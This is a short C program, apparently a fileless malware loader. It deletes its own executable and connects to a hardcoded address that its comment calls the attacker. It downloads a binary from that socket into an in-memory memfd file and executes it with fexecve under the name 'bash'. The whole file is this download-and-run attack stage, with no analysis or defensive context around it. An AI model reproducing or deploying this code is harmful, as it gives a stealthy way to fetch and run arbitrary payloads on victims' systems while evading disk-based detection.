#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/mman.h>


#define SYSCALL_memfd_create 319
#define MFD_CLOEXEC 1
#define BUF_SIZE 1024

static inline int memfd_create(const char *name, unsigned int flags)         // wrapper for the memfd_create syscall
{
	return syscall(SYSCALL_memfd_create, name, flags);
}

int	main(int argc, char *argv[], char *env[])
{
	if(fork() == 0)
		return (0);
	unlink(argv[0]);
	pid_t	pid;
	int	fd;
	int	s, l;
	unsigned long addr = 0x0100007f11110002;
	unsigned char buf[BUF_SIZE];

	char *name[2] = {"bash", NULL};

	// connect to attacker -> download from socket fd and write into fd 'a'
	s = socket(AF_INET, SOCK_STREAM, 0);
	connect(s, (struct sockaddr*)&addr, 16);
	fd = memfd_create("y", MFD_CLOEXEC);

	while (1)
	{
		if ((l = recv(s, buf, BUF_SIZE, 0)) <= 0)
			break;
		write(fd, buf, l);
	}
	close(s);
	fexecve(fd, name, env);
	return (0);
}
